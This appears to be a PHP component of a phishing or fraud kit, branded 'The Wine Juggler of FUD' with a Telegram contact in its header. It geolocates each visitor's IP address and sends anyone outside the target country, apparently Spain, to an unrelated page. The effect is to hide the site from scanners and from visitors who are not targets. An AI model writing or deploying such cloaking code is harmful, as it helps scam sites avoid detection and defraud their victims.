<?php
/**
###############################################
#         Version 2.0                         #
#         https://t.me/neo_net                #
#         The Wine Juggler of FUD             #
###############################################
**/
//$urlBase = $_SERVER['DOCUMENT_ROOT'];

$urlBase = $_SERVER['DOCUMENT_ROOT']."/primerolacarta";



require_once $urlBase.'/country-block/reader.php';
require_once $urlBase.'/config/config.php';


if ($localhost == 1) {
}
else {
if (!empty($_SERVER["HTTP_CLIENT_IP"])){
//check for ip from share internet
$ip = $_SERVER["HTTP_CLIENT_IP"];}
elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){
// Check for the Proxy User
$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];}
else{
$ip = $_SERVER["REMOTE_ADDR"];}
// This will print user's real IP Address
// does't matter if user using proxy or not.
if(filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
$db = new \IP2Location\Database($urlBase.'/country-block/database/ipv4/ipv4.bin', \IP2Location\Database::MEMORY_CACHE);}
else {
$db = new \IP2Location\Database($urlBase.'/country-block/database/ipv6/ipv6.bin', \IP2Location\Database::MEMORY_CACHE);}
$records = $db->lookup($ip, \IP2Location\Database::ALL);
/* If notCountry Code "ES" only */
if ($records['countryCode'] !== $pais) {
header('Location: '.'https://href.li/?'.$location_x.''); exit;
}
}

?>